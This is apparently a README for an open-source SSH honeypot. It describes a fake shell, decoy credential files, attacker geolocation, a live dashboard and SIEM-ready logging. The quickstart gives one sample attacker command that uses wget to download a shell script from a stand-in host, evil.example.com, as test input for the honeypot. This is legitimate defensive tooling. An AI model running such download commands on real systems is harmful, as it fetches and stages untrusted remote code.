# ssh-honeypot 🍯

A medium-interaction SSH honeypot that captures attacker credentials, commands, and behavior in real time. Features a live web dashboard with a world map, credential analytics, and post-authentication session capture.

![Python](https://img.shields.io/badge/Python-3.12-blue?logo=python)
![Flask](https://img.shields.io/badge/Flask-3.0-lightgrey?logo=flask)
![Paramiko](https://img.shields.io/badge/Paramiko-SSH-green)
![Docker](https://img.shields.io/badge/Docker-ready-blue?logo=docker)
![Tests](https://img.shields.io/badge/Tests-54%20passing-brightgreen)

---

## What it does

- **Listens on port 2222** acting as a real SSH server (fake OpenSSH banner)
- **Accepts any username/password** — every credential attempt is logged
- **Fake interactive shell** backed by a navigable Linux filesystem in memory
- **Captures every command** typed by attackers after "successful" login
- **Decoy files** (`passwords.txt`, `.env`, `backup.sh`) trigger high-priority alerts when read
- **Geolocates attacker IPs** with country, city, ISP (no API key needed)
- **Live dashboard** with world map, credential charts, and real-time command feed
- **Structured JSONL log** (`data/events.jsonl`) — compatible with SIEM pipelines

---

## Dashboard

The web dashboard runs at `http://127.0.0.1:8080` and updates live via Server-Sent Events (SSE).

- **World map** — Leaflet.js with animated markers per attacker IP, colored by attempt volume
- **Live feed** — every credential attempt as it happens, click any IP to fly to it on the map
- **Command feed** — post-auth commands in real time, decoy file reads highlighted in red
- **Top credentials** — bar charts for most-tried usernames and passwords
- **Country breakdown** — attack origin distribution

---

## Project structure

```
ssh-honeypot/
├── config.py                   # all tuneable settings (ports, timeouts, paths)
├── main.py                     # entry point — starts SSH server + dashboard
│
├── honeypot/
│   ├── server.py               # TCP listener, thread pool, semaphore limiting
│   ├── handler.py              # per-connection SSH handler (paramiko)
│   ├── filesystem.py           # fake navigable Linux filesystem in memory
│   ├── database.py             # SQLite persistence (attempts + commands)
│   ├── geoip.py                # IP geolocation with in-memory cache
│   └── logger.py               # structured JSONL event logger
│
├── dashboard/
│   ├── app.py                  # Flask app — REST API + SSE stream
│   └── templates/index.html   # dark dashboard with Leaflet map
│
├── tests/
│   ├── test_honeypot.py        # database, geoip, shell response tests
│   └── test_filesystem.py     # filesystem navigation, commands, decoy tests
│
├── Dockerfile                  # multi-stage build, non-root user
├── docker-compose.yml          # one-command deploy
├── ssh-honeypot.service        # systemd unit for VPS deployment
└── deploy.sh                   # automated deploy script for Ubuntu VPS
```

---

## Quickstart

### Local (development)

```bash
git clone https://github.com/YOUR_USERNAME/ssh-honeypot.git
cd ssh-honeypot

conda create -n ssh-honeypot python=3.12
conda activate ssh-honeypot

pip install -e ".[dev]"
python main.py
```

Dashboard → `http://127.0.0.1:8080`

Test the honeypot from another terminal:

```bash
ssh -p 2222 root@localhost
# Any password works — try: ls -la, cat /root/.env, cd /etc, wget http://evil.example.com/shell.sh
```

### Docker

```bash
docker compose up -d
```

Dashboard → `http://127.0.0.1:8080`

### VPS (production)

```bash
chmod +x deploy.sh
./deploy.sh <VPS_IP>
```

Access the dashboard via SSH tunnel (port 8080 is intentionally not exposed publicly):

```bash
ssh -L 8080:localhost:8080 user@<VPS_IP>
# Open http://localhost:8080
```

---

## Configuration

All settings are in `config.py` and can be overridden with environment variables:

| Variable | Default | Description |
|---|---|---|
| `SSH_PORT` | `2222` | Port the honeypot listens on |
| `DASHBOARD_PORT` | `8080` | Web dashboard port |
| `SSH_BANNER` | `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6` | Fake SSH version string |
| `SESSION_TIMEOUT` | `30` | Seconds before idle session is disconnected |
| `SSH_MAX_WORKERS` | `50` | Max concurrent SSH sessions |
| `GEOIP_ENABLED` | `true` | Enable IP geolocation (ip-api.com, no key needed) |
| `LOG_LEVEL` | `INFO` | Logging verbosity |
| `FLASK_SECRET` | — | Flask session secret (change in production) |

---

## Fake filesystem

The honeypot simulates a real Ubuntu 22.04 server filesystem. Attackers can navigate it with standard shell commands:

```
ls, ll, cd, pwd, cat, head, tail, grep, find, echo
mkdir, touch, rm, cp, mv, chmod
wget, curl, python3, which, file, stat
ps, env, history, w, uname, hostname, uptime
df, free, netstat, ss, ifconfig, ip
```

### Decoy files

Strategic files placed to capture attacker intent. Reading any of these triggers a `DECOY_READ` event logged at high severity:

| Path | Contains |
|---|---|
| `/root/.env` | Fake DB credentials, AWS keys, Stripe key |
| `/root/passwords.txt` | Fake server passwords |
| `/root/backup.sh` | Fake backup script with embedded credentials |
| `/home/ubuntu/notes.txt` | Fake admin notes with passwords |

`wget` and `curl` commands log the full URL — revealing the attacker's C2 server or payload dropper.

---

## Data and logs

All data persists in `data/` (or the Docker volume `honeypot-data`):

| File | Contents |
|---|---|
| `data/honeypot.db` | SQLite database — all attempts and commands |
| `data/events.jsonl` | Structured event log — one JSON object per line |
| `data/honeypot.log` | Human-readable server log |
| `data/server.key` | RSA host key (stable fingerprint across restarts) |

### JSONL event format

Each line in `events.jsonl` is a self-contained JSON event:

```json
{"type": "attempt", "timestamp": "2024-11-14T15:42:11Z", "ip": "1.2.3.4",
 "username": "root", "password": "123456", "geo": {"country": "China", "city": "Beijing"}}

{"type": "command", "timestamp": "2024-11-14T15:42:15Z", "ip": "1.2.3.4",
 "command": "cat /root/.env"}

{"type": "decoy_read", "timestamp": "2024-11-14T15:42:15Z", "ip": "1.2.3.4",
 "path": "/root/.env", "preview": "DB_PASSWORD=Str0ngP@ssw0rd_2024!..."}
```

This format is directly compatible with log shippers (Filebeat, Fluentd) and SIEM pipelines.

---

## Running tests

```bash
pytest -v
pytest --cov=honeypot --cov-report=term-missing
```

54 tests covering: database layer, geolocation caching, filesystem navigation, command dispatch, decoy triggers, and scoring logic.

---

## Deployment notes

- **Never expose the dashboard port (8080) to the internet** — it has no authentication. Use an SSH tunnel or put nginx with basic auth in front of it.
- **Port 2222** is safe to expose publicly — that's the point.
- **Do not run on port 22** unless you move your real SSH to another port first.
- The honeypot accepts all credentials by design. It will never grant real system access — the shell is entirely simulated in memory.

---

## Extending the project

### Adding a new decoy file

In `honeypot/filesystem.py`, add a file with `is_decoy=True` to any directory in `_build_tree()`:

```python
"api_keys.txt": _file("api_keys.txt", is_decoy=True, content=(
    "GitHub: ghp_FAKE...\n"
    "OpenAI: sk-FAKE...\n"
), perms="rw-------"),
```

### Adding a new filesystem command

In `FakeFilesystem.handle_command()`, add an entry to the `dispatch` dict:

```python
"uptime": lambda a: (" 10:42:01 up 5 days,  2:31,  1 user\r\n", False),
```

### Connecting to a SIEM

Point your log shipper at `data/events.jsonl`. Each line is valid JSON with a `type` field for filtering.

---

## License

MIT
